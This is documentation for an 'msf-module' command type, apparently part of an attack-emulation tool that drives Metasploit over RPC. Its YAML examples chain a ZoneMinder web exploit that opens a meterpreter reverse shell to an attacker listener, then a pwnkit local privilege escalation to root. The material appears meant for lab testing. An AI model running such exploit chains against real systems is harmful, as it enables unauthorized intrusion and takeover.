.. _msf-module:

==========
msf-module
==========

Execute Metasploit modules via the Metasploit RPC API.

.. note::

   To configure the connection to ``msfrpcd``, see :ref:`msf_config`.

Some modules (like auxiliary scanners) produce direct output:

.. code-block:: yaml

   commands:
     - type: msf-module
       cmd: auxiliary/scanner/portscan/tcp
       options:
         RHOSTS: 192.42.0.254

Most exploit modules do not produce direct output but instead open a session
(see :ref:`msf-session`):

.. code-block:: yaml

   commands:
     - type: msf-module
       cmd: exploit/unix/webapp/zoneminder_snapshots
       creates_session: foothold
       options:
         RHOSTS: 192.42.0.254
       payload: cmd/unix/python/meterpreter/reverse_tcp
       payload_options:
         LHOST: 192.42.2.253


.. confval:: cmd

   Path to the Metasploit module, including the module type prefix
   (e.g. ``exploit/unix/...``, ``auxiliary/scanner/...``).

   :type: str
   :required: True

.. confval:: options

   Key-value pairs of module options (e.g. ``RHOSTS``, ``RPORT``).

   :type: Dict[str, str]

.. confval:: payload

   Path to the payload to use with this module
   (e.g. ``linux/x64/shell/reverse_tcp``).

   :type: str

.. confval:: payload_options

   Key-value pairs of payload options (e.g. ``LHOST``, ``LPORT``).

   :type: Dict[str, str]

.. confval:: target

   Target index for the module. Refer to the Metasploit module documentation
   for available targets.

   :type: int
   :default: ``0``

.. confval:: creates_session

   Name to assign to the session created by this module. The session can
   subsequently be referenced in :ref:`msf-session` or other modules via
   :confval:`session`.

   :type: str

.. confval:: session

   Name of an existing session to pass to this module. Required by post-exploitation
   modules that operate within an active session.

   :type: str

   The following example illustrates the use of sessions and payloads:

.. code-block:: yaml

   commands:
     - type: msf-module
       cmd: exploit/unix/webapp/zoneminder_snapshots
       creates_session: foothold
       options:
         RHOSTS: 192.42.0.254
       payload: cmd/unix/python/meterpreter/reverse_tcp
       payload_options:
         LHOST: 192.42.2.253

     - type: msf-module
       cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
       session: foothold
       creates_session: root
       options:
         WRITABLE_DIR: "/tmp"
       payload: linux/x64/shell/reverse_tcp
       payload_options:
         LHOST: 192.42.2.253
         LPORT: 4455
